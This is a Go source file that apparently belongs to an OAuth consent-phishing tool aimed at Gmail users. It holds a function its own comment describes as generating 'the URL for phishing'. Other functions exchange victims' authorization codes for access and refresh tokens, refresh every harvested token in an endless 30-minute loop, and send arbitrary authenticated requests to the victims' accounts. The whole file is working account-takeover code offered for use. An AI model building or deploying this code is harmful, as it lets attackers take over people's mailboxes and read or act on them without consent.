package api

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"oauth2-gmail/database"
	"oauth2-gmail/model"
	"time"
)

// RefreshAccessToken will retrieve a new access token
func RefreshAccessToken(user *model.User) bool {

	postURL := "https://oauth2.googleapis.com/token"

	formdata := url.Values{}
	formdata.Add("client_id", model.GlbConfig.Oauth.ClientId)
	formdata.Add("grant_type", "refresh_token")
	formdata.Add("client_secret", model.GlbConfig.Oauth.ClientSecret)
	formdata.Add("refresh_token", user.RefreshToken)
	resp, err := http.PostForm(postURL, formdata)
	if err != nil {
		log.Printf("Error: %s \n", err.Error())
	} else {
		data, _ := ioutil.ReadAll(resp.Body)
		println(string(data))
		if resp.StatusCode == 200 {
			authResponse := model.AuthResponse{}
			json.Unmarshal(data, &authResponse)
			user.AccessToken = authResponse.AccessToken
			return true
		}
	}
	return false

}

func RecursiveTokenUpdate() {
	for {
		users := database.GetUsers()
		for _, user := range users {
			bSuccess := RefreshAccessToken(&user)
			if bSuccess {
				log.Printf("Retrieving new token for %s\n", user.Mail)
			} else {
				log.Printf("Failed updating token for %s\n", user.Mail)
				user.AccessTokenActive = 0
			}
			database.UpdateUserTokens(user)

		}
		time.Sleep(30 * time.Minute)
	}

}

// GenerateURL gives the URL for phishing
func GenerateURL() string {

	phishURL := fmt.Sprintf("https://accounts.google.com/o/oauth2/v2/auth?scope=%s&redirect_uri=%s&response_type=code&client_id=%s&access_type=%s", url.QueryEscape(model.GlbConfig.Oauth.Scope), url.QueryEscape(model.GlbConfig.Oauth.Redirecturi), url.QueryEscape(model.GlbConfig.Oauth.ClientId), url.QueryEscape(model.GlbConfig.Oauth.AccessType))
	return phishURL
	//fmt.Println(phishURL)
}

// GetAllTokens will call the microsoft endpoint to get all the tokens
func GetAllTokens(code string) []byte {
	postURL := "https://oauth2.googleapis.com/token"

	formdata := url.Values{}
	formdata.Add("client_id", model.GlbConfig.Oauth.ClientId)
	formdata.Add("scope", model.GlbConfig.Oauth.Scope)
	formdata.Add("redirect_uri", model.GlbConfig.Oauth.Redirecturi)
	formdata.Add("grant_type", "authorization_code")
	formdata.Add("client_secret", model.GlbConfig.Oauth.ClientSecret)
	formdata.Add("code", code)

	resp, err := http.PostForm(postURL, formdata)
	if err != nil {
		log.Printf("Error: %s \n", err.Error())
	} else {
		data, _ := ioutil.ReadAll(resp.Body)
		return data
	}
	return nil
}

// CallAPIMethod function
func CallAPIMethod(method string, endpoint string, interfacePath string, accessToken string, additionalParameters string, bodyData []byte, contentType string) (string, int) {

	url := fmt.Sprintf("%s%s?%s", endpoint, interfacePath, additionalParameters)
	client := &http.Client{}
	var req *http.Request
	if method == "POST" || method == "PUT" || method == "PATCH" {
		req, _ = http.NewRequest(method, url, bytes.NewBuffer(bodyData))
		req.Header.Set("Content-Type", contentType)
	} else {
		req, _ = http.NewRequest(method, url, nil)
	}
	req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", accessToken))
	resp, err := client.Do(req)
	if err != nil {
		log.Println(err.Error())
		return "", 0
	}
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Println(err.Error())
		return "", 0
	}
	return string(body), resp.StatusCode
}
